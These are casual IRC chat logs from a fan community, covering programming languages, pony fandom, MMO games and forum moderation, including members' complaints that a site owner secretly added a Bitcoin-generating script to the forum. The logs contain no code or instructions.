<Lambda> what is that?
<Stormy> no clue what that means
<Kosoveon> indeed
<Lambda> a library by the looks of it
<prince-dari> So I heard that C# is much easier to learn than C++, but is less powerful. Isn't C# the updated version of C++, shouldn't it be better?
<Stormy> http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js
<Stormy> Nice formatting there
<Lambda> XD that's disgusting
<Stormy> lol
<prince-dari> I see something about CSS. Maybe new layout?
<Stormy> Hmm, maybe
*Glacymr looks at the Kosoveon on his back and puts kyu on his head
<Lambda> updates aren't always about power
<Stormy> whatever it is, SR didn't write it himself
<Lambda> I personaly know nothing about C# though
<prince-dari> Yeah, but you would have though they wouldn't have made it worse in terms of power.
<Lambda> not necessarily
<Lambda> they may have had to sacrafice power for efficiency or speed
<Stormy> They could have just created the language for the user-friendliness
<Lambda> yeah
<Lambda> like Python
<Lord-HarlotIsACockJuggler> hmm
<Lord-HarlotIsACockJuggler> Armageddon
<Lambda> Python is sloow
<Lord-HarlotIsACockJuggler> You like my name
<Lord-HarlotIsACockJuggler> ?
<Lambda> but easy to learn
<Lord-HarlotIsACockJuggler> :D?
<prince-dari> Hm I suppose so.
<Armageddon> XD
<Armageddon> what the f
<Stormy> Annoying when you're used to java and want to use class variables everywhere
<Lambda> Haha, yeah
<Lambda> I grew to like the dynamic typing personally
<Sneas> 03FUCK NETSPLITS IN THE ASS. ok.
<Armageddon> xD
<Lambda> but it was hard getting used to
<LugiaLordOfTheSeas> I agree with Sneas
<LugiaLordOfTheSeas> XD
<prince-dari> What the hell is bitcoinplus anyway?
<Lambda> no clue here
<Stormy> I personally didn't really see the point of it
<Spyrorocks> C# is something created by microsoft i think.
<Stormy> but again
<Stormy> probably just brainwashed by java or something
<Spyrorocks> C# has a runtime
<Spyrorocks> correct me if im wrong.
<prince-dari> I wouldn't, they'd love it.

<Stormy> probably not

<prince-dari> It seems to generate 'bitcoins' for him or something.
<Lambda> what do you mean?
*LugiaLordOfTheSeas hugs back :(
<Mikey> because halfway through she still thought I was kidding
<Lambda> hmm
<Stormy> What's a bitcoin?
<Mikey> but then she got all interested in it
<Mikey> XD
<prince-dari> No idea.
<Lambda> so like something that tells him of activity or something perhaps?
<Mikey> hm
<prince-dari> http://www.bitcoinplus.com/generate
<Mikey> ?
<Neon> Bitcoin is digital currency.
<Lambda> Mikey: SR is doing something to SF
<Armageddon> >:L
<Lambda> and it's really slowing it down
<Lambda> Neon, you live
<Lambda> you wanted me earlier?
<Neon> Yeah, I was busy drawing Hitmonlee. xD
<Lambda> haha
<Spyrorocks> I thought it might be slow...
<Neon> Mhm. I assume you're aware of this? http://www.roleplaygateway.com/pokemon-the-dawning-darkness-kurokari-pokemon-t53977.html
<Spyrorocks> hmm
<Lambda> in fact I am not
<Spyrorocks> How bad is it?
<Lambda> Stormy?
<Stormy> firefox froze
<prince-dari> CPU usage of java is 90% on my computer.
<Stormy> took about 5 minutes to close it
<Neon> These are fan-made sketches, of course, but some are frigging amazing.
<Spyrorocks> OK i removed the stuff./
<Lambda> oh wow
<Lambda> they are
<Lambda> I like the Stephen Colbert picture
<Lambda> :P
<Neon> Ha, that made me laugh too.
<Stormy> http://www.bitcoinplus.com/howbitcoinworks
<Stormy> sounds... interesting
<prince-dari> 7$ per bitcoin.
<prince-dari> Meh.
<Lambda> so his upgrade
<Lambda> is to make himself money
<Neon> Just seems like a new avenue for Internet gamblers.
<prince-dari> Yep.
<Lambda> sounds GREAT for the rest of us >.<
<Stormy> lol
<Stormy> maybe I read it wrong, but...
<Mikey> what's this update
<Lambda> SR is updating SF
<Stormy> it sounds like /we'd/ be getting the bitcoins
<Mikey> what do we have to pay now or something
<prince-dari> How?
<Stormy> that's what was using all the memory
<Lambda> and we're trying to figure out what it does
<Stormy> our computers were trying to "solve the puzzle" or whatever
<Lambda> but if we're making it where does it go?
<Stormy> No idea
<Lambda> it doesn't know my bank account
<Lambda> weird
<Glacymr> 12is damos assuming that i'm an arti
<prince-dari> Why would he force all users to take part in something that doesn't benefit him?
<Stormy> It doesn't use your bank account
<Glacymr> 12*articuno
<Glacymr> 12[23:11:21] * Damos snuggles under Glacymr
<Glacymr> 12[23:14:47] * Damos is now known as Damos||SleepingUnderArticuno
<Stormy> I... don't know
<prince-dari> I'm fairly sure it either gives him the bitcoins or splits them.
<Neon> SR is in ur bank account, usin ur bitcoinz
<Lambda> this doesn't make much sense to me, I'm having trouble making sense of it
<prince-dari> LOL NEON
<Lambda> reading through that page I mean
<prince-dari> "You can use as many computers as you like, all signed in to the same account, in order to generate bitcoin faster. "
<Umbreon> 12o-o
<prince-dari> How can you make bitcoins if you don't have an account?
<Neon> Does he expect everyone to have an entire computer lab running at once?
<Umbreon> 12LugiaLordOfTheSeas~~
<Lambda> what if his code
<Lambda> makes everyone who's on the site automatically be signed in to his account
<prince-dari> That's what I was thinking.
<Lambda> therefore generating a ton of money
<Neon> That would have to be it.
<Lambda> That's really dishonest if you ask me
<prince-dari> LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOL
<prince-dari> Will this slow down my computer?
<prince-dari> No. The bitcoin generator only uses your spare computing time. It runs at a low priority, so if you start using other applications, it will get out of the way so that your other applications won't slow down. Try it - you should find that your computer is just as fast (or slow) as it normally is.
<Lambda> if it is true
<prince-dari> That has to be a lie.
<Neon> low priority den shut everyting else DOWN i ned 2 genurate mah bitxoinz!!!11!1one!
<Lambda> that or he implemented it poorly
<Mikey> I'm confused
<Stormy> XD
<Mikey> if you're logged into something it gives you money? what?
<Stormy> Lies
<prince-dari> Well either way - it was about money.
<Stormy> We don't really get it either
<Lambda> yeah, that's all we know
<prince-dari> Nothing really added to the site.
<Lambda> we're trying to figure out the rest
<Stormy> Apparently whatever SR did was giving him or us some kind of virtual curency
<Neon> Mikey: OFF has been milking us for bitcoin money. Deactive right away! xD
<Stormy> *currency
<Mikey> :P
<Neon> ...We established this a long time ago. You guys weren't aware of bitcoin before this?
<Stormy> No...?
<Stormy> Why should I have been?
<prince-dari> Forums aren't real time enough, I was thinking you should have a forum where each thread is real time.
<Neon> No reason, I'm just surprised.
<Lambda> I'd never heard of bitcoin
<prince-dari> ^
<prince-dari> Same.
<Neon> I only had a vague idea of what it was.
<Neon> Never had any real use for it.
<Neon> Basically it's allows for anonymous, encrypted transactions. People use it for illegal trade.
<Neon> *it
<prince-dari> SR wants in on the black market.
<Stormy> He's been in on the blackmarket
<prince-dari> Oh? Lol.
<Neon> xD Yup, so he can compete with my Matter Destroyer app.
<Lambda> what with selling illegal lazorz and all?
<Lambda> :P
<Neon> He sells lazors to teenagers who want to blind pilots.
<prince-dari> Hahaha.
<Stormy> Let's just say some of his methods of making money haven't been exactly legal or ethical
<Neon> Or sane.
<LugiaLordOfTheSeas> Umbreon~~
<Umbreon> 12how goes bud :3
<LugiaLordOfTheSeas> Not bad thanks, bit bored at the moment though, considering bed
<LugiaLordOfTheSeas> Yourself? :>
<Umbreon> 12i'm messing with mabi
<LugiaLordOfTheSeas> :o
<Umbreon> 12but i keep running into deadends no matter what route i take
<Umbreon> 12i want to do G14 but i can't even get past scene 1
<LugiaLordOfTheSeas> UGH G14
<Umbreon> 12i decided to shift over to my healer pure
<Neon> Shoot, 12:30.
<Umbreon> 12ran out of AP to rank up healing, first aid gets kind of hard to rank up now since i'm r9 and the quest to reach r8 is crazy
<Umbreon> 12so i shift to campfire and now i'm stuck there because i can't get hold of any wooden boards
<LugiaLordOfTheSeas> First Aid is a pain to rank up
<prince-dari> http://www.youtube.com/watch?v=TaPEr1Mg2i0
<LugiaLordOfTheSeas> I've got it at r9
<prince-dari> Pony MMO anyone? :P
<Umbreon> 12LugiaLordOfTheSeas
<Umbreon> 12i'm at rank 9 as well
<Neon> Well, it was nice patronizing you all and offering little to no support. Later.
<Umbreon> 12no thanks prince
<LugiaLordOfTheSeas> I'm not bothering with the life skills much at the moment
<Lambda> patronizing?
<Umbreon> 12i hate combat
<Umbreon> 12i always die too easy
<LugiaLordOfTheSeas> Apart from Refining, Blacksmithing
<Lambda> I didn't think you patronized us
<Umbreon> 12so i just like life skills
<Umbreon> 12only thing i'm good at
<Neon> "You guys weren't aware of bitcoin before this?"
<LugiaLordOfTheSeas> I've got all my combat skills at R1 so yeah
<Umbreon> 12meh
<Umbreon> 12even all the masteries?
<LugiaLordOfTheSeas> Working on Magic skills at the moment
<LugiaLordOfTheSeas> and yeah
<Umbreon> 12sword mastery blunt mastery
<prince-dari> That just seems like genuine surprise.
<Umbreon> 12running mastery
<Lambda> I just read it as an honest question
<LugiaLordOfTheSeas> Since when were they skills?
<Umbreon> 12since i am my old normal self and just like to be annoying
<Neon> I was kind of exaggerating. But it didn't sit right with me after I said it. Anyway, hopefully I'll have Hitmonlee up by tomorrow.
<prince-dari> What?
<prince-dari> Hitmonlee?
<Lambda> It's not a problem Neon, we took no offense

<Stormy> I mean really

<LugiaLordOfTheSeas> Smash and Defense are good to master
<Stormy> LOL
<prince-dari> Hahahaha.
<Lambda> ohhh that Nope
<Lambda> I'm familiar with that
<Lambda> I hadn't even thought of that
<Umbreon> 12defense is so much CP though
<Lambda> Mikey: what is it?
<Aristeo> Heh
<Mikey> huh
<Lambda> [23:47] <+Mikey> HAAAAAAAAAAAAAAAAAAAAAAAAAAAAY YOUUUUUUUUUUUUUUUUUUU GUYYYYYYYYYYYYYYYYYYYYYYYYYYS
<Mikey> oh I thought that would be what you say when you go into epic-chat tomorrow
<Lambda> oh
<Lambda> hahahaha
<Lambda> I should say that too
<Mikey> also
<Mikey> I love how stormy has children like Stormknight but there is no Stormda? :P
<Stormy> XD
<Lambda> I was actually about to say Stormbda
<Stormy> It's because they're all designed to annoy me
<Stormy> Thus I was never paired with anyone I actually like
<Stormy> :P
<Lambda> and also with me the kids will be for real
<Lambda> :P
<Stormy> haha
<Lambda> and we would never name them something so ridiculous
<prince-dari> CP...Hmm, I only know one thing that fits in that abbreviation.
<Lambda> I prefer something more like... Ash
<Lambda> or Brock
<Stormy> Are you saying Stormknight isn't real?!?!?!
<Stormy> :O
<Mikey> your going to name your kid apple
<Lambda> Apple Head
<Lambda> Head is his middle name
<Stormy> Apple Bloom
<Lambda> or that yeah
<Lambda> or Big
<Lambda> Macintosh
<Stormy> Exactly
<Mikey> I feel like making a facebook account called Apple Head Mrozek
<Mikey> noq
<Mikey> *now
<Stormy> XDDDDD
<Lambda> I'll call him Big Mac when I'm feeling carefree
<Stormy> yay for pony references that RDX doesn't get
<Mikey> and pasting an apple on some random kids head
<prince-dari> Hahaha.
<Lambda> then buy him one
<Mikey> HEY BIG MAC U WANT MIG MAC?????

<Mikey> XDDD
<prince-dari> tasty*
<Mikey> unfortunately chicken normally makes me feel sick
<prince-dari> Scootaloo makes you feel sick? :o
<Mikey> scootaloo isn't a chicken
<Spyrorocks> Aristeo,
<Spyrorocks> <mitkok> Hey, guys. Is there an easy way to split an array of 100 integers for example and write 3 numbers per line separated by whitespace into a file ?
<Spyrorocks> <Izhido> #include "realeasyfunctions.h" / Split100intArrayWrite3xLineWithWhitespaceInto(FILE* f);
<Umbreon> 12no wonder i'm failing so badly LugiaLordOfTheSeas
<prince-dari> No, Scootaloo is the definiton of chicken.
<Umbreon> 12my total level got over 300 x-x
<Mikey> ...ah
<Lambda> Hahaha
<Lambda> I thought of that half way through
<Mikey> well, it does when I eat it
<Lambda> "Oh crap, I just mentioned ponies"
<Lambda> speaking of which
<Mikey> BANBANBANBANBANBANBAN
<Lambda> nice jab back there dari

<prince-dari> McDonald's and Disney, easy mistake to make I supposed? :P
<Stormy> http://www.youtube.com/watch?v=bu54kU0ebqE
<Stormy> See?
<prince-dari> suppose*
<Stormy> Scootaloo is a chicken
<Umbreon> 12advanced is 300+ is it not?
<LugiaLordOfTheSeas> Yeah HM is 1000+
<Umbreon> 12so being 310 i'm still fresh advanced
<prince-dari> XD
<Umbreon> 12so it should be hard
<LugiaLordOfTheSeas> Yeah I remember doing G10 at 1100 odd
<Umbreon> 12sigh
<Umbreon> 12i wanted to be a cook so badly
<prince-dari> Hahahaha.
<prince-dari> http://bronibooru.mlponies.com/data/preview/e29d3d68f249d28af8a38e59a022ebae.jpg
<LugiaLordOfTheSeas> G9 and G10 was a pain in the ass
<LugiaLordOfTheSeas> The Shadow Realm is sooo fucking laggy
<Umbreon> 12i got to r8 then couldn't get any further because kitchen dungeon stinks
<LugiaLordOfTheSeas> That's a solo dungeon isn't it?
<Aristeo> xD
<Umbreon> 12yes
<prince-dari> What are you two even talking about?
<LugiaLordOfTheSeas> A game
<prince-dari> ...
<prince-dari> I got that much.
<LugiaLordOfTheSeas> Mabinogi
<Lambda> Stormy has to leave us
<Lambda> Noooooo
<prince-dari> Internet gone?
<Mikey> :C
<Lambda> 5
<Lambda> 4
<Lambda> 3
<Lambda> 2
<Lambda> 1
<Lambda> boom
<prince-dari> Hahaha.
<prince-dari> Fail.
<prince-dari> :P
<Lambda> yeah, her internets died
<Umbreon> 12LOL
<Umbreon> 12i just got the skillful title
<prince-dari> 25 seconds off.
<prince-dari> :P
<Umbreon> 12and the wise title at the sametime
<prince-dari> Closer than last time. XD
<LugiaLordOfTheSeas> xD
<Lambda> haha
<Lambda> yeah
<Lambda> this time I knew it was 2 minute
<Umbreon> 12woah why is my stats so high
<prince-dari> Internet being cut off at 12 would suck.
<Lambda> yeah it would
<prince-dari> Since I'm pretty much nocturnal.
<Umbreon> 12str is supposed to be 105 it's some179how buffed to
<Lambda> for me it wouldn't matter much seeing as I have to get up for work anyway
<Lambda> but still
<Mikey> dari you're not nocturnal you never sleep ever
<Mikey> it's insane
<prince-dari> Yeah, I don't have to go in for school much at the moment.
<prince-dari> Because of exams.
<LugiaLordOfTheSeas> equipment and title buffs maybe
<Lambda> So, this other show I've been watching lately that I'm obsessed with
<Lambda> the main character
<Lambda> is a brony
<Umbreon> 12my title is the dragonslayer
<prince-dari> LULWUT?
<Lambda> one sec
<LugiaLordOfTheSeas> Can't remember what the buffs are for that title
<Mikey> lady gaga is a brony too
<Umbreon> 12maxHP +30
<prince-dari> Oh yeah.
<Mikey> she was seen with a rarity doll on her necklace
<Umbreon> 12maxMP +10
<Umbreon> 12max stam +10
<Lambda> http://www.youtube.com/watch?v=ov7e3p1I1UM
<Lambda> 2:33
<Umbreon> 12defense and protection +2
<prince-dari> And a possible Spyro fan? XD Lawl.
<Umbreon> 12has nothing to do with strength
<LugiaLordOfTheSeas> I'm using The Furious Master of Smash
<Umbreon> 12hmm now that i'm out of the theater my stats have returned to normal
<Mikey> :P
<Lambda> *2:37 would be more accurate
<prince-dari> Never heard of this show before.
<Lambda> Firefly
<Mikey> that's because lambda is a tv nerd
<Lambda> it's f'ing awesome
<Mikey> and knows every show and movie in existence
<Lambda> it got cancelled after ONE SEASON
<Lambda> but everyone loves it
<Lambda> so much they made a movie in place of season two
<Umbreon> 12screw smash and defense i'm going for r1 combat mastery
<Lambda> it's a Western crossed with a sci-fi
<prince-dari> That sounds pretty cool.
<Umbreon> 12i'm so tired of easily being killed going to buff my HP so high that that doesn't happen
<prince-dari> Bet no one's ever tried that before. XD
<LugiaLordOfTheSeas> Combat Mastery is the easiest to get the CP for XD
<Lambda> I don't think so
<Umbreon> 12i don't want CP
<Lambda> it seems strange but it works really well
<Umbreon> 12sadly XD
<LugiaLordOfTheSeas> XD
<Umbreon> 12i want to get r1 Windmill first before it gets too high
<prince-dari> Actually I remember a sci-fi/western film.
<Lambda> this show makes up for my manliness lost due to MLP
<prince-dari> Lost?
<prince-dari> Manliness is gained from MLP. :P
<Lambda> hmm
<Lambda> maybe manliness isn't the right word
<Lambda> badassery
<Lambda> (if I ever had any to begin with)
<Lambda> oh dari
<prince-dari> Yes?
<Lambda> I have yet to encounter an English character who's not evil however :P
<Lambda> and I'm almost done watching the movie
<prince-dari> Yeah, Americans always make the Brits evil.
<Lambda> hahaha
<Lambda> we do
<Lambda> we really do
<Lambda> but you (accurately) make us stupid
<prince-dari> Hahaha.
<LugiaLordOfTheSeas> anyways I'm off
<LugiaLordOfTheSeas> gonna have a couple of hours sleep before meeting my friends
<LugiaLordOfTheSeas> laters
<prince-dari> I swear one of the actors in that show is from 'Chuck'.
<Lambda> yeah
<Lambda> one is
<Lambda> I forget who though
<Lambda> I just know one of these people is in it
<Lambda> what the heck amazon
<Lambda> it stopped streaming my movie
<Lambda> only 15 minutes left
<Lambda> the torture
<prince-dari> ...

<prince-dari> Those last 15 minutes you shall never see.
<Lambda> nah, I got the DVD
<prince-dari> Oh, never mind then. XD
<Lambda> it came with a rented digital copy
<Lambda> and I'm too impatient to wait for it to ship
<prince-dari> I might watch some ponies...Again...
<Lambda> so I'm watching the digital one
<Lambda> I will too
<Lambda> I've still got my nightlyepisode ahead of me
<prince-dari> I don't know how you manage one a night.
<prince-dari> Even though I've seen them all before usually I watch 2-3.

<Damos> O*
<Damos> a large pokemon games center
<Damos> and a death ray place for HML to use

<Light_Latias> nice
<Light_Latias> o-o
<drf|laptop> 03but I basically hurt my hand because a hard drive is a little bigger than a penny LOL
<drf|laptop> 03meaning it needs a lot more force
<Zoroark> me and a friend once took a sledgehammer to a hard drive
<drf|laptop> 03and LL, no I wasn't just destroying it because I'm a boy :P
<Zoroark> well it was a maul, sledgehammer-axe thing
<drf|laptop> 03I did it because generally if you throw out a hard drive you want to destroy it so that nobody can recover your data
<Zoroark> we beat the scheisse out of that thing with the axe side and we barely managed to puncture a hole in the disk
<drf|laptop> 03yeah
<prince-dari> Dashing...
<drf|laptop> 03I have a video on YouTube of my friend and i trying to destroy an old 60GB one
<drf|laptop> 03that was the same way
<drf|laptop> 03we barely put a dent in it
<prince-dari> (:
<Zoroark> it was 20GB
<drf|laptop> 03after throwing it on the ground and taking a hammer to it
<drf|laptop> 03I wish I had an axe XD
<Zoroark> from 2000
<drf|laptop> 03this was 2003
<drf|laptop> 03the drive I just dejstroyed was early 2008
<drf|laptop> 03and as far as i know, 500GB is the biggest IDE drives that have ever been made
<Zoroark> we also did that to a couple old motherboards
<drf|laptop> 03LOL
<drf|laptop> 03why would you destroy motherboards
<drf|laptop> 03or was it just for lulz?
<Zoroark> they both didn't work
<Zoroark> at all
<Zoroark> one of them, my friend's he tried to use and it started smoking
<Zoroark> i think he also said it made a popping noise
<Zoroark> before aforementioned smoking
<Light_Latias> jeez
<Zoroark> so yeah it was fubar already
<Zoroark> we also smashed an old pentium chip
<drf|laptop> 03LOL
<Light_Latias> doesnt she know smoking is bad for her health?

<Neon> Not yet. My scanner isn't working and the friend who was going to scan it for me hasn't yet.
<prince-dari> Stop! You violated the law. Pay the court a fine or serve your sentence. Your stolen goods are now forfeit.

<Zoroark> yep
<Stormy> with patterns on them
<Neon> That's awesome. Do you have any pictures?
<Stormy> I never scan them

<Lambda> [23:51] <@prince-dari> Sleep - I fail at it. <- me too lately
<Mikey> aaaaand see you guys again later, maybe
<prince-dari> Lol.
<prince-dari> Oh.
<prince-dari> Haha.
<Lambda> Woah, she dun disappeared
<Lambda> I won't be up much longer
<Lambda> I need some sleep for tomorrow
<prince-dari> Ok.
<Lambda> you have any more exams?
<prince-dari> Yeah, today.
<prince-dari> In 3 hours.
<Lambda> Haha
<Lambda> have you been able to sleep at all?
<prince-dari> http://www.youtube.com/watch?v=2Tjb14VoWjg&feature=player_embedded
<prince-dari> Wow.
<prince-dari> I tend to sleep a bit during the day.
<Lambda> what subject is this one?
<prince-dari> Physics.
<Lambda> ah
<Lambda> you must be getting close to done, eh?
<prince-dari> Nope, 13 or so more.
<Lambda> D:
<Lambda> really?
<Lambda> wow
<Lambda> I've never even had close to that many classes at once
<prince-dari> I suppose the school system is just different over here.
<Lambda> max for me was 8
<Lambda> yeah, probably
<Lambda> Stormy had like four classes a day
<Lambda> I had 9 (one of which was lunch)
<Lambda> college is so weird for me
<Lambda> only having three or four classes per day
<Lambda> for her it's natural
<prince-dari> Yeah.
<Lambda> how many per day do you have over there?
<prince-dari> It used to be 8, but they changed it to 4 that are twice as long.
<Lambda> ah
<Lambda> so it went from what I had to what she had by the sounds of it
<Lambda> is it a small town where you live, or are you in more of a city area?
<prince-dari> I live just outside a big town.
<Lambda> ah
<prince-dari> Well, on the outskirts but technically still part of it.
<Lambda> yeah, sounds kinda like Mikey and Seattle
<Lambda> and you go to that town's school I imagine?
<Lambda> there's not a small one in your neighborhood?
<Typhlosion> What the hell
<Typhlosion> So many people here
<prince-dari> Yeah, I go to that town's school, but that's not what most people would expect.
<prince-dari> It's a grammar school, so most people go to one of the other (probably larger) schools around.
<Lambda> ah
<prince-dari> Do you know what a grammar shcool is? I don't know if they have them in America.
<Lambda> we don't have them, but I know of them
<Lambda> I kinda wished I was British when I was younger
<Lambda> :P
<Lambda> read up on what it's like there sometimes
<prince-dari> Haha, who wouldn't? :P
<Lambda> Haha
<prince-dari> XD
<Lambda> I still want to go there
<Lambda> not necesarily live there
<prince-dari> Yeah, kind of lucky that I have my school near me, the others aren't nice places to be.
<prince-dari> Mainly.
<Lambda> yeah, I can imagine
<Lambda> I'd probably be so out of place someplace like that
<Lambda> XD
<Lambda> everyone'd know me as the american with the slightly canadian accent
<prince-dari> Hah, my sister had the misfortune of having to go to a pretty bad school, she was really unhappy there. Goes to a different place now though (although she'll be leaving for university soon).
<Lambda> oh, your sister is older than you?
<prince-dari> Yeah.
<prince-dari> Just turned 18.
<Lambda> for some reason I always imagined her being younger when you mention her
<prince-dari> Must be because I'm so mature. Hahaha. :P
<Lambda> Hahaha
<Lambda> or the reverse is true of her maybe
<Lambda> :P
<prince-dari> Lol, maybe.
<prince-dari> LOL this video is long, but AWESOME
<Lambda> the one from earlier?
<prince-dari> Go go power rangers!
<prince-dari> Yeah.
<Lambda> the anthology one?
<prince-dari> Yep.
<prince-dari> I think it's a compilation of loads of videos.
<prince-dari> Made by different people.
<Lambda> ah, yeah
<Lambda> those can be good sometimes
<Lambda> as long as there isn't one person who ruins the whole thing because their bit is so bad
<Lambda> :P
<prince-dari> They're all fairly short anyway.
<prince-dari> LOL
<prince-dari> JAZZ SPIKE!
<prince-dari> LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOL
<Lambda> reallly?
<Lambda> hahahaha
<Lambda> when in the video?
<prince-dari> Just before 16:00
<Lambda> hahahaha
<Lambda> that's awesome
<prince-dari> Among the images that I downloaded was an executive's toy with Rainbow Dash instead of balls.
<Lambda> XD nice
<prince-dari> A GIF
<Lambda> oh, I was on wikipedia earlier today
<Lambda> it explained Scootaloo as "A tomboy of epic proportions"
<Lambda> which I found hilarious
<prince-dari> Lol.
<Lambda> but by the time I had the link it got changed
<Lambda> :(
<prince-dari> Ah. XD
<prince-dari> OMG

<prince-dari> A lad had been going through a lot of problems lately regarding his conditions and surgeries, which include about 60+ surgeries, autism, synesthasia, ventilator, no cilia, and many others. He had issued a plea for support on youtube and had his video posted on /b/. Before /b/ got involved, the video only had 17 views. Soon, /b/ began to flood the video's comments with, get this, kind and encouraging words and support, even on his channel!
<prince-dari> That video now has over 80,000+ views, along with a new video that followed up after words.
<Caaz> interestin.
<prince-dari> I am majorly surprised. I thought they were just the scum of the internet.
<Caaz> They do nice things sometimes.
<prince-dari> Hm.
<Skyla> i had botted a few thousand of those views
<Skyla> then i ran out of proxies

<NightSeas> 12Eh, haii is so ruining the CBox
<drfsupercenter> 03it's not CBox
<drfsupercenter> 03it's spambox
<prince-dari> Jazz Spike is awesome. XD
<NightSeas> 12With haii around it is
<Mikey> hell yeah
<drfsupercenter> 03no, it's always that way
<Damos> hey Nick.. Chan
<drfsupercenter> 03the point of those boxes is to spam them'
<NightSeas> 12Not really, that's just what people use them for
<Damos> hey Nickary Chan
<Damos> thats much better
*Nickario playfully attacks Damos like Jackie chan
<NightSeas> 12A CBox is actually suppose to be calmer then chat
*Damos is a ghost pokemon right now
<drfsupercenter> 03OMG
<drfsupercenter> 03Why are you making this so difficult NightSeas
<drfsupercenter> 03I'm being sarcastic, nujmber one
<drfsupercenter> 03-j
<drfsupercenter> 03and number two, nobody actually does that, it's just for spamming
<Damos> cause its fun
<drfsupercenter> 03so stfu XD
<junh1024-XD> how about a DBox?
<drfsupercenter> 03DBox?
<drfsupercenter> 03those motion controlled things?
<junh1024-XD> Dbox!
<Damos> what about a Jack in the Box?
<junh1024-XD> nah, its like, a Cbox, but increment the first letter by 1.
<Steve> 12 Hello, RedDragonX and welcome to #draconicwolves. To see the scripts type !command, and for information on use type: !help <script>
<NightSeas> 12You can only say one word in a DBox. "Eww"
<NightSeas> 12Or, Eww Apple
<Damos> so thats why drf is spamimg there
<Stormy> Hey RDX
<Stormy> I just banned that Ziamber dude for two days
<Stormy> Just so you know
<drfsupercenter> 03there's also Dick in a ZBox
*drfsupercenter hides
<drfsupercenter> 03-Z
<Angel_Espeon> 13LOL
<drfsupercenter> 03and I'm playing Dream World games right now so that's why it's taking me a while to reply :P
<HyperMetalLugia> OLOLWhat
<prince-dari> Lol.
<Damos> whats in the dream?
<drfsupercenter> 03your mom
<HyperMetalLugia> Weird stuff
<Stormy> Pretty sure he's only there to troll
<HyperMetalLugia> :P
<Damos> eww
<Stormy> But you can never tell sometimes
<Angel_Espeon> 13SPeaking of DW, they're working on fixing the eeveelution error now
<Stormy> Sometimes people are really just stupid
<Angel_Espeon> 13though they said it could possibly take a few weeks
<Damos> you pervert
<drfsupercenter> 03yeah so I heard
<prince-dari> RDX can't moderate pony threads. Hahaha.
<Stormy> ol
<Stormy> *Lol
<junh1024-XD> oh btwm
<RedDragonX> Yes I saw
<junh1024-XD> i think a floating chair > non-floating chair
<RedDragonX> just another common troll
<Stormy> Someone keeps making these troll accounts too
<Damos> LOL
<Stormy> But never posts in them
<NightSeas> 12Ah, well. CBox is still good anyways. Haii just gets a little annoying
<RedDragonX> most of them are old
<drfsupercenter> 03it's good if you like spamming
<RedDragonX> planted before or around when that little "raid' junk happened
<Stormy> No, I mean recent ones
<Stormy> http://www.spyroforum.com/user-4918.html
<Stormy> http://www.spyroforum.com/user-4914.html
<RedDragonX> well that's not surprising either
<Stormy> http://www.spyroforum.com/user-4892.html
<Stormy> I think it's Ziamber doing it
<RedDragonX> one user shouldn't be allowed to create multiple accounts from the same IP
<RedDragonX> according to SR
<Stormy> I don't know how they're even being activated
<Stormy> Because none of them seem to be valid emails
<NightSeas> 12Actually, Haii gets super annoying
<Shadow_Lugia> 6Still?
<Shadow_Lugia> 6What's she up to now?
<RedDragonX> Well, like I said he made it so that one IP couldn't have more then one account, but who knows, maybe he's changed something since then
<NightSeas> 12Yes, in this way that you can't get her on
<Stormy> Ziamber has posted from more than one IP
<Stormy> But it doesn't really matter
<RedDragonX> well I'll have to ask SR about it
<Stormy> As long as they're not posting
<Stormy> They're not really doing any harm, just annoying to anyone who looks at the newest member thing
<RedDragonX> well if he's going to keep pulling this crap from account to account I just want to get rid of them all together
<NightSeas> 12Just look at the CBox if you want to know what I mean: http://www.lugia.us/forum/index.php
<RedDragonX> hopefully he just shuts up after getting bored
<Stormy> I don't know it's him for sure, but it seems like it is
<Shadow_Lugia> 6Someone needs to tell her that not everyone can respond to her in 5 seconds. Ovo
<HyperMetalLugia> o.o
<Stormy> One of the troll accounts had that Osama bin Laden picture in the website field
<RedDragonX> yeah I know
<RedDragonX> I'll ask SR
<Stormy> and some of them mention "Mark" and he mentioned that name in some of his nonsense spam
<Stormy> K
<RedDragonX> even though I'll get the same answer
<Stormy> Half of them have the word "cripple"
<Stormy> wtf
<RedDragonX> and since you guys are talking about ponies you should more then expect the common troll about :P
<Stormy> he was around long before the pony stuff started
<RedDragonX> I know it was just a joke
<Stormy> But you're probably right
<Stormy> :P
<prince-dari> Ponies are the most anti-troll material ever.
<RedDragonX> you all remember what happened to Dragon Missionary
<Stormy> Well he was just way too sensitive
<prince-dari> Dragon Missionary, nope?
<Stormy> SR just asked "Why?" to him collecting MLP
<RedDragonX> yeah but it all started with him admitting he was obssessed with My Little Pony
<Stormy> And he flipped out about it
<RedDragonX> yeah But SR didn't exactly make any attempts to stop
<RedDragonX> nor care about doing so
<RedDragonX> hence why Kazoobie is gone now
<Stormy> oh I'm not saying SR was completely innocent
<NightSeas> 12It's people like her that made Arti take down the CBox in the first place
<Shadow_Lugia> 6Hmm.
<RedDragonX> I know
<RedDragonX> he was sensative yes
<prince-dari> I don't use the forums much.
<prince-dari> Just talk to you guys.
<Stormy> Just that if something like that happens again it's not like anything like that will happen to any of us
<drfsupercenter> 03again, it's not a CBox, it's a spambox.
<RedDragonX> who are you?
<Stormy> We all have thicker skin than DM here
<Shadow_Lugia> 6Oh, and HML, you might also want to state that randomly saying messages when no one is in the chatbox is basically spam. :>
<RedDragonX> Yeah I know
<RedDragonX> it's just a very trollable topic
<prince-dari> I think it's the least trollable topic there is...
<NightSeas> 12Or a SBox drf XD
<RedDragonX> either way if the guy shouldn't be able to post from the same IP
<Stormy> Well
<Stormy> people can try to troll
<Stormy> But they won't get anywhere
<prince-dari> You've proven that it's much easier to troll people who don't like ponies, RDX. :P
<HyperMetalLugia> Lolspam
<HyperMetalLugia> Well I can't tell if anyone is talkng
<HyperMetalLugia> Since the Cbox is borked
<RedDragonX> I didn't care if you guys were talking about ponies
<RedDragonX> you can talk about it as much as you want
<NightSeas> 12Nah, talking when no one is around is what a CBox is for
<RedDragonX> I just don't like it when others try to push me to do something I haven't chosen to do myself, at least extensively :P
<prince-dari> Yeah right, he didn't care. Haha.
<Stormy> Mhm
<Stormy> Ah well
<NightSeas> 12But not over and over like Haii does
<prince-dari> I didn't mean to push you to do anything, I was just talking about them, sorry.
<RedDragonX> no need to be sorry
<RedDragonX> that and after working 70 hours a week I can be in a very inpatient mood myself
<RedDragonX> either way it's all good
